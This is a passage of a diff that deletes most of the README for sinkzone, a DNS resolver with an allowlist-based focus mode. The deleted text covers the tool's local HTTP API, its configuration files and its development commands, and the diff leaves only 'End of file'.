-- `GET /health` - Health check endpoint
-
-**API Usage Examples:**
-```bash
-# Start resolver with custom API port
-sinkzone resolver --port 53 --api-port 8080
-
-# Use CLI with custom API URL
-sinkzone monitor --api-url http://127.0.0.1:8080
-sinkzone focus --enable --api-url http://127.0.0.1:8080
-sinkzone tui --api-url http://127.0.0.1:8080
-
-# Direct API calls
-curl http://127.0.0.1:8080/api/queries
-curl http://127.0.0.1:8080/api/focus
-curl -X POST http://127.0.0.1:8080/api/focus \
-  -H "Content-Type: application/json" \
-  -d '{"enabled": true, "duration": "1h"}'
-```
-
-### Normal Mode
-
-* All DNS queries are forwarded to upstream resolvers
-* You can view and manage DNS traffic and allowlist
-
-### Focus Mode
-
-* Only allowlisted domains resolve
-* Everything else returns `NXDOMAIN`
-* Automatically expires after specified duration
-* Allowlist is reloaded when focus mode is enabled (changes take effect on new focus sessions)
-
----
-
-## Configuration
-
-Files are stored in `~/.sinkzone/`:
-
-* `sinkzone.yaml`: Main config
-* `allowlist.txt`: Simple text file containing allowed domains (supports wildcard patterns)
-* `resolver.pid`: Process ID file for the DNS resolver
-
-**Allowlist Format:**
-```
-# Comments start with #
-github.com
-stackoverflow.com
-*github*
-*.google.com
-api.*.com
-```
-
----
-
-## Development
-
-```bash
-# Build binary
-go build -o sinkzone .
-
-# Run tests
-go test ./...
-
-# Run resolver with custom ports
-sinkzone resolver --port 5353 --api-port 8080
-
-# Test API endpoints
-curl http://127.0.0.1:8080/health
-curl http://127.0.0.1:8080/api/queries
-
-# Run TUI with custom API URL
-sinkzone tui --api-url http://127.0.0.1:8080
-```
-
-**Architecture:**
-- DNS Server: Handles DNS resolution and blocking
-- HTTP API Server: Provides REST endpoints for monitoring and control
-- CLI/TUI: User interfaces that communicate via HTTP API
-
-PRs and issues welcome. We love contributors.
-
----
-
-## License
-
-MIT License. See the [LICENSE](LICENSE) file for full details.
-
----
-
-## Contact
-
-* Email: [dominis@ber.run](mailto:dominis@ber.run)
-* GitHub: [github.com/berbyte/sinkzone](https://github.com/berbyte/sinkzone)
-
-<p align="right">(<a href="#readme-top">back to top</a>)</p>
+End of file
